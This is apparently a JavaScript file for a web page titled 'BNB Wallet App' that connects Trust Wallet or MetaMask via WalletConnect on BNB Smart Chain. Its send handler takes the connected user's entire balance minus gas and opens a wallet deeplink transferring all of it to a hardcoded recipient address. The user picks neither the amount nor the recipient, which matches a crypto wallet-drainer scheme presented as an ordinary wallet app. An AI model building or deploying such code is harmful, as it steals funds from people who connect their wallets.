import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
import { ethers } from "ethers";

const projectId = "YOUR_PROJECT_ID"; // WalletConnect Project ID
const TO_ADDRESS = "0xYourRecipientAddressHere"; // ← آدرس مقصد BNB
const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

let userAddress = null;
let currentWallet = null; // 'trust' یا 'metamask'

const modal = new WalletConnectModalSign({
  projectId,
  metadata: {
    name: "BNB Wallet App",
    description: "Direct send with deeplink",
    url: "https://yourdomain.com",
    icons: ["https://walletconnect.com/walletconnect-logo.png"]
  }
});

document.getElementById("connectTrust").addEventListener("click", async () => {
  currentWallet = "trust";
  await connectWallet("https://link.trustwallet.com/wc?uri=");
});

document.getElementById("connectMetaMask").addEventListener("click", async () => {
  currentWallet = "metamask";
  await connectWallet("https://metamask.app.link/wc?uri=");
});

async function connectWallet(baseLink) {
  try {
    const { uri, approval } = await modal.signClient.connect({
      requiredNamespaces: {
        eip155: {
          methods: ["eth_sendTransaction"],
          chains: ["eip155:56"],
          events: ["accountsChanged", "chainChanged"]
        }
      }
    });

    if (uri) {
      window.location.href = `${baseLink}${encodeURIComponent(uri)}`;
    }

    const session = await approval();
    const address = session.namespaces.eip155.accounts[0].split(":")[2];
    userAddress = address;

    document.getElementById("address").textContent = address;

    const balance = await provider.getBalance(address);
    document.getElementById("balance").textContent = `${ethers.formatEther(balance)} BNB`;

    document.getElementById("sendBtn").disabled = false;

  } catch (err) {
    console.error("Connection error:", err);
    alert("Connection failed.");
  }
}

document.getElementById("sendBtn").addEventListener("click", async () => {
  if (!userAddress || !currentWallet) {
    alert("Wallet not connected.");
    return;
  }

  try {
    const balance = await provider.getBalance(userAddress);

    const gasLimit = 21000n;
    const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
    const fee = gasLimit * gasPrice;
    const amountToSend = balance - fee;

    if (amountToSend <= 0n) {
      alert("Insufficient BNB.");
      return;
    }

    const amountBNB = ethers.formatEther(amountToSend);
    const amountWei = amountToSend.toString();

    let deeplink = "";

    if (currentWallet === "trust") {
      deeplink = `https://link.trustwallet.com/send?address=${TO_ADDRESS}&amount=${amountBNB}&asset=BNB`;
    } else if (currentWallet === "metamask") {
      deeplink = `https://metamask.app.link/send/${TO_ADDRESS}@56?value=${amountWei}`;
    }

    window.location.href = deeplink;

  } catch (err) {
    console.error("Send error:", err);
    alert("Send failed: " + err.message);
  }
});